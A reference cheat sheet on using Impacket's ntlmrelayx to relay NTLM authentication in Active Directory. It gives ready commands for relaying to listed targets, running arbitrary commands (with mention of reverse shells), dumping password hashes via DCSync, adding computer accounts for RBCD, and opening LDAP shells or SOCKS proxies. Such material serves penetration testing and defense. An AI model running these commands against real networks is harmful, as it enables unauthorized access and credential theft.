**ntlmrelayx** is a powerful tool from the Impacket toolkit used for relaying captured NTLM authentication attempts to other network services. It is particularly effective in Windows Active Directory (AD) environments, allowing attackers to gain unauthorized access to network resources by relaying credentials.


---

## Core Functionality and Setup

|Option|Description|Notes|
|---|---|---|
|**Relaying**|The primary function: receiving a Type 3 NTLM message and forwarding it to the target service.|The tool acts as a listener on multiple ports (SMB/HTTP by default).|
|**Cross-Protocol**|The tool supports relaying between different protocols (e.g., HTTP → SMB, or SMB → **LDAPS**).|This is crucial for attacks against Domain Controllers.|
|**Session Persistence**|After a successful relay, the tool maintains the authenticated session for post-exploitation actions.|This allows for command execution or proxy setup.|

---

## Usage

#### Configuring Target List:

- Create a `targets.txt` file with the IP addresses or hostnames of the target AD servers you want to relay the captured credentials to.
```bash
192.168.1.10 
192.168.1.11
```

#### Starting NTLMRelayx.py:

- Use NTLMRelayx.py to relay captured NTLM authentication attempts to the targets listed in `targets.txt`.
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```
- Also, NTLMRelayx.py can be configured to execute a certain command of our election after pawning one of the target hosts. This could be used to obtain a reverse shell from the target.
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "<command>"
```


### Advanced Post-Exploitation Actions

`ntlmrelayx.py` offers specific actions that can be performed automatically upon successfully compromising a target, making it highly effective for privilege escalation.

|Action Flag|Target Protocol|Description|Example Command (Defense/Education Focus)|
|---|---|---|---|
|**`-c <command>`**|**SMB**|Executes a specified command (e.g., `whoami`, adding a user) on the successfully relayed target host.|`ntlmrelayx.py -tf targets.txt -c "whoami /all"`|
|**`--dump-secrets`**|**LDAPS**|Attempts high-privilege operations like **DCSync** to dump all user password hashes or retrieve **LAPS passwords** from Active Directory.|`ntlmrelayx.py -t ldaps://DC-IP --dump-secrets`|
|**`--add-computer`**|**LDAPS**|Creates a new computer account in Active Directory. Used as the setup phase for a **Resource-Based Constrained Delegation (RBCD)** attack.|`ntlmrelayx.py -t ldaps://DC-IP --add-computer`|
|**`-i` (Interactive)**|**LDAPS**|Starts a local listener (e.g., on port 9999) that provides an **interactive LDAP shell** for manual queries after a successful relay.|`ntlmrelayx.py -t ldaps://domain.local -i`|
|**`-socks`**|**Any**|Creates a local **SOCKS proxy** (usually on port 1080) to tunnel and direct other attack tools using the relayed user's credentials.|`ntlmrelayx.py -t <IP> -socks`|